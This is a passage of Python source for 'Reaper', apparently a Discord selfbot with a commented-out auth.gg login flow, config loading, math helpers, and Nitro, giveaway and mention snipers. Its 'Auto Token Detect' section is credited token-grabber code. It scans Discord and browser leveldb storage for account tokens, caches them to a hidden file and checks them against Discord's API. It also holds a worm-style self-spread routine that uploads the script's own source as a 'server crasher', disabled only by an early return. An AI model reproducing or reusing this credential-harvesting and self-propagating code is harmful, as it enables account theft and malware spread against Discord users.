      #              response_2 = request_2.text
       #             flag2 = (response_2 == request_2.text)
        #            if flag2:
         #               if "success" in response_2:
          #                  print("\n")
           #                 try:
           #                     with open("login.json", "w") as f:
                                #    try:
                                #        normal = "{"+f"\"username\": \"{username}\","+f" \"password\": \"{password}\""+"}"
                                #        f.write(normal)
                                #        f.close()
                                #    except Exception as e:
                                #        print(e)
                                #        sleep(3)

                      #              try:
                       #                 creds = json.load(open("login.json", "r"))
                        #                creds["username"] = username
                         #               json.dump(creds, f)
                          #              creds["password"] = password
                          #              json.dump(creds, f)
                          #              with open("login.json", "w") as f:
                          #                  creds = json.load(open("login.json", "r"))
                           #                 creds["auto-login"] = True
                           #                 json.dump(creds, f)
                            #        except:
                             #           normal = "{"+f"\"username\":\"{username}\","+f"\"password\":\"{password}\",\"auto-login\":true"+"}"
                              #          f.write(normal)

                                #f = open("login.json", "w")
                                #try:
                                #    creds = json.load(open("login.json", "r"))
                                #    creds["username"] = username
                                #    creds["password"] = password
                                #    json.dump(creds, f)
                                #except Exception as e:
                                #    print(e)
                                #    sleep(9)
                                #    try:
                                #        creds = { "username": username, "password": password }
                                #        creds["username"] = username
                                #        creds["password"] = password
                                #        json.dump(creds, f, indent=2)
                                #    except Exception as e:
                                #        print(e)
                                #        sleep(9)
                                #        normal = "{"+f"\"username\": \"{username}\","+f" \"password\": \"{password}\""+"}"
                                #        f.write(normal)
       #                     except Exception as e:
        #                        print(e)
         #                       sleep(3)
          #                  _ff = f"Successfully logged in as {username}"
          #                  _f = f"S|u|c|c|e|s|s|f|u|l|l|y| |l|o|g|g|e|d| |i|n| |a|s| |{Style.BRIGHT}{username}{Style.RESET_ALL}".split("|")
           #                 sys.stdout.write(" "*round((116 - len(_ff)) / 2) +(Style.RESET_ALL))
            #                for i in range(len(_ff)):
             #                   sys.stdout.write(Style.RESET_ALL+Fore.WHITE+_f[i % len(_ff)])
              #                  sys.stdout.flush()
               #                 sleep(0.005)
                #            sleep(2)
                 #       else:
                  #          if "invalid_details" in response_2:
                   #             u = 3
                   #             print("\n\n")
                    #            while u != 0:
                     #               sys.stdout.write("\r  "+errorcol+"Username or password is invalid! ({count})".format(count=str(u)))
                      #              u = u - 1
                      #              sleep(1)
                      #          mainProgram()
                       #     elif "invalid_hwid" in response_2:
                        #        print("\n")
                        #        u = 3
                         #       while u != 0:
                          #          sys.stdout.write("\r  "+errorcol+"Invalid HWID, please do not attempt to share accounts! ("+str(u)+")")
                           #         sleep(1)
                            #        u = u - 1
                             #   mainProgram()
      #                      elif "hwid_updated" in response_2:
       #                         print("\n")
        #                        u = 5
         #                       while u != 0:
          #                          sys.stdout.write("\r  "+errorcol+"Your HWID has been updated, relogin! ("+str(u)+")")
          #                          sleep(1)
           #                         u = u - 1
            #                    mainProgram()
             #               elif "time_expired" in response_2:
              #                  print("\n")
               #                 u = 5
                #                while u != 0:
                 #                   sys.stdout.write("\r  "+errorcol+"Your subscription has expired! ("+str(u)+")")
                  #                  sleep(1)
                   #                 u = u - 1
                    #            mainProgram()
        #                    elif "net_error" in response_2:
         #                       print("\n")
         #                       u = 5
          #                      while u != 0:
         #                           sys.stdout.write("\r  "+errorcol+"Something went wrong! ("+str(u)+")")
          #                          sleep(1)
           #                         u = u - 1
            #                    mainProgram()
             #               else:
              #                  print("\n")
               #                 u = 5
                #                while u != 0:
                 #                   sys.stdout.write("\r  "+errorcol+"Something went wrong! ("+str(u)+")")
                  #                  sleep(1)
                   #                 u = u - 1
                    #            mainProgram()
                #    else:
     #                   os._exit(0)
      #          end()
       #     except:
        #        pass
    #    else:
     #       messagebox.showerror("Reaper Authentication", "Login is not available at this time!")
      #      os._exit(0)
  #  def register():
   #     if register_status == 0:
   ##         global username
    #        global password
     #       os.system("cls")
      #      title()
       #     stripline2()
        #    print(_center("{cb}Please enter key: ({c}XXXXX-XXXXX-XXXXX-XXXXX-XXXXX{r})".format(cb=c.b, c=Style.RESET_ALL, r=Style.BRIGHT), 36))
#            token = input(" "*2+"</> ")
 #           print(" "*51+c.b+"Please enter email: ")
  #          email = input(" "*2+"</> ")
   #         print(" "*50+c.b+"Please enter username: ")
    #        username = input(" "*2+"</> ")
     #       print(" "*50+c.b+"Please enter password: ")
      #      password = input(" "*2+"</> ")
       #     print(" "*47+c.b+"Please confirm your password: ")
 #           u2 = username
  #          p2 = password
   #         c_password = input(" "*2+"</> ")
    #        if c_password != p2:
     #           print("\n\n"+" "*46+errorcol+"Passwords do not match!") 
      #          sleep(3)
       #         register()
   #         headers = {"User-Agent": "AuthGG"}
  #          data = {
   #             "type": "register",
  #              "aid": aid,
   #             "random": random_,
    #            'apikey': apikey,
     #           "secret": secret,
      #          "username": u2,
       #         "password": p2,
        #        "email": email,
         #       "token": token,
          #      "hwid": hwid
  #          }
   #         try:
    #            with requests.Session() as sess:
     #               sess.trust_env = False
      #              request_3 = sess.post('https://api.auth.gg/version2/api.php', verify=True, data=data, headers=headers)
       #             response_3 = request_3.text
        #            flag3 = (response_3 == request_3.text)
         #           if flag3:
          #              if "success" in response_3:
           #                 messagebox.showinfo("Reaper Authentication", "Thank you for choosing Reaper! {}, you have successfully registered!".format(u2))
            #                sleep(1)
             #               try:
              #                  with open("login.json", "w") as f:
               #                     f.write("{}")
                #                    try:
                 #                       creds = json.load(open("login.json", "r"))
                  ##                      creds["username"] = username
                    #                    creds["password"] = password
                     #                   json.dump(creds, f)
                      #              except:
                       #                 f.write("{}")
                        #                creds = { "username": username, "password": password }
                         #               creds["username"] = username
                          #              creds["password"] = password
                           #             json.dump(creds, f)
                            #        else:
                             #           normal = "{"+f"\"username\": \"{username}\","+f" \"password\": \"{password}\""+"}"
                     #                   f.write(normal)
   #                         except Exception as e:
    #                            print(e)
     #                           sleep(3)
      #                  else:
       #                     if "invalid_token" in response_3:
        #                        print("\r  "+errorcol+"Key is invalid or already used")
         #                       sleep(4)
          #                      mainProgram()
           #                 elif "invalid_username" in response_3:
            #                    print("\r  "+errorcol+"Username already taken, please choose another one")
             #                   sleep(4)
              #                  mainProgram()
               #             elif "email_used" in response_3:
                #                print("\r  "+errorcol+'Email is invalid or in use!')
                 #               sleep(4)
                  #              mainProgram()
                   #         else:
                    #            print("\r  "+errorcol+"Something went wrong!")
                     #           sleep(4)
                      #          mainProgram()
  #                  else:
   #                     mainProgram()
    #        except:
     #           messagebox.showerror("Reaper Authentication", "Something went wrong!")
      #          mainProgram()
   #     else:
    #        messagebox.showerror("Reaper Authentication", "Register is not available at this time!")
    #        mainProgram()
    #integrity_check()
   # main_()
 # mainProgram()

# PART VI: Config File

token = config["Login"].get('Token')
footer = config["Config"]["Embeds"].get('Footer')
prefix = config["Config"]['Prefix']
if int(config["Config"]["DeleteMsgTime"]):
    if config["Config"]["DeleteMsgTime"] == None:
        delinterval = 999999
    elif config["Config"]["DeleteMsgTime"] == "None":
        delinterval = 999999
    elif config["Config"]["DeleteMsgTime"] == "none":
        delinterval = 999999
    else:
        delinterval = int(config["Config"]["DeleteMsgTime"])
pr = [prefix, prefix.upper(), prefix.lower()]
emimage = config["Config"]["Embeds"].get('Image')
emimagealt = config["Config"]["Embeds"]["LargeImage"]
giveaway_sniper = config["Snipers"]['GiveawaySniper']["Enabled"]
nitro_sniper = config["Snipers"]['NitroSniper']["Enabled"]
mentionlogs = config["Snipers"]["Mentions"]["Enabled"]
try: emcolor = discord.Color (int(int("0x" + (config["Config"]["Embeds"]["Color"].split("#")[1]), 16)))
except: emcolor = 0x0058c6
if token == 'INSERT TOKEN HERE': print(logs+"Enter a token in the config.yml file."); system('title Error!'); sleep(5); exit()

# PART VII: Auto Token Detect (Not Fully Functional)

autotoken__ = []
if token == 'Automatic':
    # BY MRNONFATAL
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        "Discord"           : ROAMING + "\\Discord",
        "Discord Canary"    : ROAMING + "\\discordcanary",
        "Discord PTB"       : ROAMING + "\\discordptb",
        "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
        "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
        "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }
    def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    def gettokens(path):
        path += "\\Local Storage\\leveldb"
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens
    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
    def spread(token, form_data, delay):
        return # Remove to re-enabled
    def main():
        cache_path = ROAMING + "\\.cache~$"
        self_spread = True
        embeds = []
        working = []
        checked = []
        already_cached_tokens = []
        working_ids = []
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in gettokens(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in working_ids:
                        continue
                working_ids.append(uid)
                working.append(token)
                embed = {"color": emcolor, "fields": [{"name": "**Token**", "value": token, "inline": False}]}
                embeds.append(embed)
                autotoken__.append(token)
        with open(cache_path, "a") as file_:
            for token in checked:
                if not token in already_cached_tokens:
                    file_.write(token + "\n")
        if len(working) == 0:
            working.append('123')
        if self_spread:
            for token in working:
                with open(argv[0], encoding="utf-8") as file:
                    content = file.read()
                payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
                Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
    try:
        main()
    except Exception as e:
        print(e)
    os.system('cls')
    print("\n\n\n\n\n")
    print(" "*35+errorcol+"Loading reaper selfbot... please wait...")
    done = 1
    list_account = []
    for t in autotoken__:
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def getuserdata(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
            except:
                pass
        user_data = getuserdata(t)
        if not user_data:
            continue
        name = f"{Style.RESET_ALL}"+user_data["username"] + c.b+"#"+f"{Style.RESET_ALL}" + str(user_data["discriminator"])
        list_account.append(name)
        done = done + 1
    os.system("cls")
    title()
    stripline()
    print()
    print(_center(f"{Style.RESET_ALL}Please enter an option:\n", 48))
    ctypes.windll.kernel32.SetConsoleTitleW("Please pick an account to use!")
    ten = 1
    for name in list_account:
        print(_center(f"{Style.RESET_ALL}[ {str(ten)} ]"+" "*2+name, 48))
        ten += 1
    turtle = input(_center("</> ", 2))
    ctypes.windll.kernel32.SetConsoleTitleW("Loading...")
    try:
        int(turtle)
        if int(turtle) > len(autotoken__):
            print("\n"+" "*44+errorcol+"Invalid answer!")
            sleep(2.7)
            os._exit(0)
        elif int(turtle) == 0:
            print("\n"+" "*44+errorcol+"Invalid answer!")
            sleep(2.7)
            os._exit(0)
        else:
            creds = json.load(open("login.json", "r"))
            with open("./login.json", "w") as f:
                turtle_token = str(autotoken__[int(turtle)])
                creds["enctoken"] = base64.b32encode(turtle_token.encode('ascii')).decode('ascii')
                json.dump(creds, f)
    except Exception as e:
        print(e)
        print("\n"+" "*47+errorcol+"Invalid answer!")
        sleep(2.7)
        os._exit(0)
if token == 'Automatic': hoe_token = base64.b32decode(json.load(open("login.json", "r"))["enctoken"].encode('ascii')).decode('ascii')
else: hoe_token = token

# PART IIX: Base of the bot

caseInsesitive = False if config["Config"]["CmdsCaseSensitive"] == True else True
sb = True if config["Login"]["Bot"] == False else False
reaper = commands.Bot(command_prefix=prefix, self_bot=sb, case_insensitive=caseInsesitive)
reaper.remove_command("help")

# PART IX: Bot Vars

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'}
regionals = {
    'a': '\N{REGIONAL INDICATOR SYMBOL LETTER A}', 'b': '\N{REGIONAL INDICATOR SYMBOL LETTER B}',
    'c': '\N{REGIONAL INDICATOR SYMBOL LETTER C}',
    'd': '\N{REGIONAL INDICATOR SYMBOL LETTER D}', 'e': '\N{REGIONAL INDICATOR SYMBOL LETTER E}',
    'f': '\N{REGIONAL INDICATOR SYMBOL LETTER F}',
    'g': '\N{REGIONAL INDICATOR SYMBOL LETTER G}', 'h': '\N{REGIONAL INDICATOR SYMBOL LETTER H}',
    'i': '\N{REGIONAL INDICATOR SYMBOL LETTER I}',
    'j': '\N{REGIONAL INDICATOR SYMBOL LETTER J}', 'k': '\N{REGIONAL INDICATOR SYMBOL LETTER K}',
    'l': '\N{REGIONAL INDICATOR SYMBOL LETTER L}',
    'm': '\N{REGIONAL INDICATOR SYMBOL LETTER M}', 'n': '\N{REGIONAL INDICATOR SYMBOL LETTER N}',
    'o': '\N{REGIONAL INDICATOR SYMBOL LETTER O}',
    'p': '\N{REGIONAL INDICATOR SYMBOL LETTER P}', 'q': '\N{REGIONAL INDICATOR SYMBOL LETTER Q}',
    'r': '\N{REGIONAL INDICATOR SYMBOL LETTER R}',
    's': '\N{REGIONAL INDICATOR SYMBOL LETTER S}', 't': '\N{REGIONAL INDICATOR SYMBOL LETTER T}',
    'u': '\N{REGIONAL INDICATOR SYMBOL LETTER U}',
    'v': '\N{REGIONAL INDICATOR SYMBOL LETTER V}', 'w': '\N{REGIONAL INDICATOR SYMBOL LETTER W}',
    'x': '\N{REGIONAL INDICATOR SYMBOL LETTER X}',
    'y': '\N{REGIONAL INDICATOR SYMBOL LETTER Y}', 'z': '\N{REGIONAL INDICATOR SYMBOL LETTER Z}',
    '0': '0⃣', '1': '1⃣', '2': '2⃣', '3': '3⃣',
    '4': '4⃣', '5': '5⃣', '6': '6⃣', '7': '7⃣', '8': '8⃣', '9': '9⃣', '!': '\u2757',
    '?': '\u2753'}
emoji_reg = re.compile(r'<:.+?:([0-9]{15,21})>')
text_flip = {}
char_list = "!#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}"
alt_char_list = "{|}zʎxʍʌnʇsɹbdouɯlʞɾᴉɥƃɟǝpɔqɐ,‾^[\\]Z⅄XMΛ∩┴SɹQԀONW˥ʞſIHפℲƎpƆq∀@¿<=>;:68ㄥ9ϛㄣƐᄅƖ0/˙-'+*(),⅋%$#¡"[::- 1]
for idx, char in enumerate(char_list):
    text_flip[char] = alt_char_list[idx]
    text_flip[alt_char_list[idx]] = char
def async_executor():
    loop = asyncio.get_event_loop()
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer
@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang='en')
    tts.write_to_fp(f)
    f.seek(0)
    return f

# PART X: Math Functions

def mfmultiply(arg5 : int, arg6 : int, n1 : int = '0', n2 : int = '0'):
    if n1 == '0':
        return (f"{arg5} × {arg6} = {arg5 * arg6}")
    if n2 == '0':
        return (f"{arg5} × {arg6} × {n1} = {arg5 * arg6 * n1}")
    return (f"{arg5} × {arg6} × {n1} × {n2} = {arg5 * arg6 * n1 * n2}")
def mfdivide(arg7 : int, arg8 : int, n1 : int = '0', n2 : int = '0'):
    if n1 == '0':
        return (f"{arg7} ÷ {arg8} = {arg7 / arg8}")
    if n2 == '0':
        return (f"{arg7} ÷ {arg8} ÷ {n1} = {arg7 / arg8 / n1}")
    return (f"{arg7} ÷ {arg8} ÷ {n1} ÷ {n2} = {arg7 / arg8 / n1 / n2}")
def mfadd(arg9 : int, arg10 : int, n1 : int = '0', n2 : int = '0'):
    if n1 == '0':
        return (f"{arg9} + {arg10} = {arg9 + arg10}")
    if n2 == '0':
        return (f"{arg9} + {arg10} + {n1} = {arg9 + arg10 + n1}")
    return (f"{arg9} + {arg10} + {n1} + {n2} = {arg9 + arg10 + n1 + n2}")
def mfsubstract(arg11 : int, arg12 : int, n1 : int = '0', n2 : int = '0'):
    if n1 == '0':
        return (f"{arg11} - {arg12} = {arg11 - arg12}")
    if n2 == '0':
        return (f"{arg11} - {arg12} - {n1} = {arg11 - arg12 - n1}")
    return (f"{arg11} - {arg12} - {n1} - {n2} = {arg11 - arg12 - n1 - n2}")
def mfsquare(arg34_1, arg34_2):
    return (f"{arg34_1} ^ {arg34_2} = {arg34_1 ** arg34_2}")

# PART XI: On Ready Functions

@reaper.event
async def on_ready():
    print()
    ctypes.windll.kernel32.SetConsoleTitleW(f'Reaper Selfbot [{CURRENT_VERSION}] Account: {reaper.user} ({username})')
    #print(logs + f"Welcome back to Reaper Selfbot, {Fore.YELLOW}{Style.BRIGHT}{reaper.user.name}{Style.RESET_ALL}{Fore.WHITE}!")
    lognoPrint("{} Injected to Discord.".format(timenow()))
    #print(logs+"Prefix: {}".format(prefix))
    sys.stdout.write("\033[0m\n")
    def animlogin():
        _f1 = f"L|o|g|g|e|d| |i|n| |a|s| |{Fore.YELLOW}".split("|")
        _f2 = f"{Fore.WHITE}| |(|{Style.RESET_ALL}{Fore.YELLOW}".split("|")
        _f3 = f"{c.b}{Fore.WHITE}|)".split("|")
        sys.stdout.write(s.space+s.sblue)
        for i in range(len(_f1)):
            sys.stdout.write(_f1[i % len(_f1)])
            sys.stdout.flush()
            sleep(0.005)
        for i in range(len(str(reaper.user))):
            sys.stdout.write(str(reaper.user)[i % len(str(reaper.user))])
            sys.stdout.flush()
            sleep(0.005)
        for i in range(len(_f2)):
            sys.stdout.write(_f2[i % len(_f2)])
            sys.stdout.flush()
            sleep(0.005)
        for i in range(len(username)):
            sys.stdout.write(username[i % len(username)])
            sys.stdout.flush()
            sleep(0.005)
        for i in range(len(_f3)):
            sys.stdout.write(_f3[i % len(_f3)])
            sys.stdout.flush()
            sleep(0.005)
        print()
    animlogin()
    if config["Config"]["ShowSettingsOnStartup"] == True:
        print(s.space+f"[{c.b}{Fore.YELLOW}{Style.RESET_ALL} - {Fore.WHITE}] Account Info: {Style.RESET_ALL}{reaper.user.name}{Style.BRIGHT}#{Style.RESET_ALL}{reaper.user.discriminator} ({Style.BRIGHT}ID: {Style.RESET_ALL}{str(reaper.user.id)}{c.b})")
        print(s.space+f"[{c.b}{Fore.YELLOW}{Style.RESET_ALL} - {Fore.WHITE}] Prefix: {c.b}{Fore.YELLOW}{prefix}"+Fore.RESET)
        print(s.space+f"[{c.b}{Fore.YELLOW}{Style.RESET_ALL} - {Fore.WHITE}] Delete Message Interval: {c.b}{Fore.YELLOW}{delinterval}"+Fore.RESET)
        if config["Config"]["CompatibleMode"] == True:
            print(s.space+f"{c.b}[{Fore.GREEN} - {Fore.WHITE}] Compatibility Mode: {Fore.GREEN}Enabled"+Fore.RESET)
        elif config["Config"]["CompatibleMode"] == False:
            print(s.space+f"{c.b}[{Fore.RED} - {Fore.WHITE}] Compatibility Mode: {Fore.RED}Disabled"+Fore.RESET)
        if nitro_sniper == True:
            print(s.space+f"{c.b}[{Fore.GREEN} - {Fore.WHITE}] Nitro Sniper: {Fore.GREEN}Enabled"+Fore.RESET)
        elif nitro_sniper == False:
            print(s.space+f"{c.b}[{Fore.RED} - {Fore.WHITE}] Nitro Sniper: {Fore.RED}Disabled"+Fore.RESET)
        if giveaway_sniper == True:
            print(s.space+f"{c.b}[{Fore.GREEN} - {Fore.WHITE}] Giveaway Sniper: {Fore.GREEN}Enabled"+Fore.RESET)
        elif giveaway_sniper == False:
            print(s.space+f"{c.b}[{Fore.RED} - {Fore.WHITE}] Giveaway Sniper: {Fore.RED}Disabled"+Fore.RESET)
        if mentionlogs == True:
            print(s.space+f"{c.b}[{Fore.GREEN} - {Fore.WHITE}] Mention Logs: {Fore.GREEN}Enabled"+Fore.RESET)
        elif mentionlogs == False:
            print(s.space+f"{c.b}[{Fore.RED} - {Fore.WHITE}] Mention Logs: {Fore.RED}Disabled"+Fore.RESET)

# PART XII: SNIPERS

session = requests.Session()

@reaper.event
async def on_message(message):
    ntUsed = []
    ntInvalid = []
    class self():
        bot = reaper
        gwsniper = giveaway_sniper
        nitrosniper = nitro_sniper
        mentions = mentionlogs
        blacklistpg = config["Snipers"]["Mentions"]["Blacklisted"]
        pgdes = config["Snipers"]["Mentions"]["DesktopNotify"]
        pgwb = config["Snipers"]["Mentions"]['WebhookLog']
        blacklistnt = config["Snipers"]["NitroSniper"]["Blacklisted"]
        ntdes = config["Snipers"]["NitroSniper"]["DesktopNotify"]
        ntwb = config["Snipers"]["NitroSniper"]["WebhookLog"]
        ntheaders = {'Authorization': hoe_token}
        ntheaders2 = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36','Authorization': hoe_token}
        blacklistgw = config["Snipers"]["GiveawaySniper"]["Blacklisted"]
        gwdes = config["Snipers"]["GiveawaySniper"]["DesktopNotify"]
        gwbotids = config["Snipers"]["GiveawaySniper"]["GiveawayBotIDs"]
        gwres = config["Snipers"]["GiveawaySniper"]["WaitBeforeReact"]
        gwwb = config["Snipers"]["GiveawaySniper"]["WebhookLog"]
    if self.mentions == True:
        if f"<@!{reaper.user.id}>" in message.content:
            blacklist = self.blacklistpg
            if isinstance(message.channel, discord.channel.DMChannel):
                try:
                    if message.author.id in blacklist["UserIDs"]:
                        return
                except:
                    pass
            else:
                try:
                    if message.guild.id in blacklist["ServerIDs"]:
                        return
                    if message.channel.id in blacklist["ChannelIDs"]:
                        return
                    if message.author.id in blacklist["UserIDs"]:
                        return
                except:
                    pass
            try:
                des = self.pgdes
                def n(m:str):
                    if compat == False:
                        if des["Enabled"] == True:
                            return os.system(f"ntfy -t \"SOMEONE MENTIONED YOU\" send \"{m}\"")
                if isinstance(message.channel, discord.channel.DMChannel):
                    print(s.space+s.red+f"Mentioned on DMs [{message.author.name}{lightbluecol}#{Fore.WHITE}{message.author.discriminator}]: {message.content}")
                    lognoPrint("Pinged on DMs ({c})".format(c=str(message.author)))
                    n(f"Channel: DMs ({message.author})")
                    if self.pgwb["Link"] == "INSERT WEBHOOK LINK HERE":
                        return
                    try:
                        sleep(self.pgwb["SendDelayMS"] / 1000)
                        urlopen(Request(self.pgwb["Link"], data=dumps({"content": "", "embeds": [{"title": "Reaper Ping Notification", "color": emcolor, "fields": [{"name": "Message", "value": message.content+f"\n[Message Link]({message.jump_url})"}, {"name": "Stats", "value": f"Channel: DMs\nAuthor: {message.author.mention}\nBot? "+"no" if message.author.bot == False else "yes"+f"\nMessage ID: {message.id}"}], "author": {"name": message.author, "icon_url": message.author.avatar_url}, "footer": {"text": f"Mention Logs Webhook | {footer}"}, "thumbnail": {"url": emimage}}]}).encode(), headers=getheaders()))
                    except:
                        print(errorcol+"Invalid webhook link (Ping Webhook)")
                else:
                    print(s.space+s.red+f"Mentioned on {Fore.YELLOW}{message.guild.name}{Fore.WHITE} [{message.author.name}{lightbluecol}#{Fore.WHITE}{message.author.discriminator} | {lightbluecol}#{Fore.WHITE}{message.channel.name}]: {message.content}")
                    lognoPrint("Pinged on {s} (#{c})".format(s=str(message.guild.name), c=str(message.channel.name)))
                    n(f"Server: {message.guild.name} ({message.author})")
                    if self.pgwb["Link"] == "INSERT WEBHOOK LINK HERE":
                        return
                    try:
                        sleep(self.pgwb["SendDelayMS"]) / 1000
                        urlopen(Request(self.pgwb["Link"], data=dumps({"content": "", "embeds": [{"title": "Reaper Ping Notification", "color": emcolor, "fields": [{"name": "Message", "value": message.content+f"\n[Message Link]({message.jump_url})"}, {"name": "Stats", "value": f"Channel: {message.channel.mention}\nServer: {message.guild.name}\nAuthor: {message.author.mention}\nBot? "+"no" if message.author.bot == False else "yes"+f"\nMessage ID: {message.id}"}], "author": {"name": message.author, "icon_url": message.author.avatar_url}, "footer": {"text": f"Mention Logs Webhook | {footer}"}, "thumbnail": {"url": emimage}}]}).encode(), headers=getheaders()))
                    except:
                        print(errorcol+"Invalid webhook link (Ping Webhook)")
            except Exception as e:
                print(e)
    if self.nitrosniper == True:
        if 'discord.gift/' in message.content:
            start = pytime.time()
            blacklist = self.blacklistnt
            User_Agent = "User-Agent"
            remd = config["Snipers"]\
                ["NitroSniper"]\
                ["RedeemSettings"]
            rend = remd["UserAgent"]
            def nitrodata(m: int = 0, code = "", elapsed_: str = ""):
                _t = 'SNIPED A NITRO CODE'
                if m == 1: 
                    _s = f'{Fore.LIGHTGREEN_EX}Successfully Redeemed'
                    _n = 'Success'
                    col_ = Fore.LIGHTGREEN_EX
                    lognoPrint(f'Redeemed Valid Code (https://discord.gift/{code})')
                elif m == 0: 
                    _s = f'{Fore.LIGHTYELLOW_EX}Used'
                    _n = 'Used'
                    col_ = Fore.LIGHTYELLOW_EX
                    lognoPrint(f'Found Used Nitro Code (https://discord.gift/{code})')
                elif m == -1: 
                    _s = f'{Fore.LIGHTRED_EX}Invalid'
                    _n = 'Invalid'
                    col_ = Fore.LIGHTRED_EX
                    lognoPrint(f'Found Invalid Nitro Code (https://discord.gift/{code})')
                elif m == -2: 
                    _s = f'{Fore.LIGHTRED_EX}Invalid (Autodetect)'
                    _n = 'Invalid (Autodetect)'
                    col_ = Fore.LIGHTRED_EX
                    lognoPrint(f'Found Invalid Nitro Code (https://discord.gift/{code})')
                def notif():
                    try:
                        notification.notify(
                            title=f'{_t}',
                            message=f'Server: {message.guild}\nChannel: {message.channel}\nStatus: {_n}',
                            app_name='Reaper Nitro Sniper',
                            app_icon='./assets/logo.ico',
                            timeout=int (self.ntdes["Timeout"])
                        )
                        return 0
                    except:
                        return -2
                def postWb(type_, code):
                    wb = self.ntwb["Link"]
                    if wb == "": return
                    elif wb == "INSERT WEBHOOK LINK HERE": return
                    else:
                        try:
                            if self.ntwb["SendDelayMS"]:
                                sl = (int(self.ntwb["SendDelayMS"]) / 1000)
                                sleep(sl)
                            session.post(wb, data=dumps(
                                {"content": "", 
                                "embeds": [{
                                    "color": 0xffa500, 
                                    "title": "Reaper Nitro Sniper", 
                                    "description": f"Nitro Data:", 
                                    "fields": [{
                                        "name": "Status", 
                                        "value": type_}, {
                                        'name': "Code", 
                                        "value": f"https://discord,gift/{str(code)}"}, {
                                        "name": "Time Taken", 
                                        "value": f"{elapsed_}"}, {
                                        "name": "Server", 
                                        "value": f"{message.guild.name}"}, {
                                        "name": "Channel", 
                                        "value": f"{message.channel.mention}"}, {
                                        "name": "Message Link", 
                                        "value": f"{message.jump_url}"}], 
                                    "footer": {'text': f"Reaper Nitro Sniper | {footer}"}}]}).encode(), headers=getheaders())
                            return 0
                        except:
                            return -3
                def printInfo():
                    nl = "\n"
                    _m = "\n" +\
                    s.space+s.sblue+f"{Fore.LIGHTWHITE_EX}Nitro Sniper Data:{Style.RESET_ALL}" +nl+\
                    f"    {Fore.LIGHTWHITE_EX}Code: {col_}{code}" +nl+\
                    f"    {Fore.LIGHTWHITE_EX}Status: {_s}" +nl+\
                    f"    {Fore.LIGHTWHITE_EX}Elapsed: {Fore.LIGHTYELLOW_EX}{elapsed_}" +nl+\
                    f"    {Fore.LIGHTWHITE_EX}Server: {Fore.LIGHTYELLOW_EX}{message.guild.name}" +nl+\
                    f"    {Fore.LIGHTWHITE_EX}Channel: {Fore.LIGHTYELLOW_EX}{message.channel.name}" +Fore.RESET+Style.RESET_ALL + nl
                    print(_m)
                if True:
                    flag1 = postWb(f"{_n} Code", code)
                    if des["Enabled"] == True: flag2 = notif()
                    flag3 = printInfo()
                    if (flag1 == -3): print(errorcol+"Invalid webhook link (Giveaway Webhook)")
                    elif (flag1 == 0): pass
                    if (flag2 == -2): print(errorcol+"An error occured while trying to send notification.")
                    elif (flag2 == 0): pass
                    if (flag3 == -1): pass
                    elif (flag3 == 0): pass
                    return 0
            if remd["RedeemToOtherToken"]["Enabled"] == True:
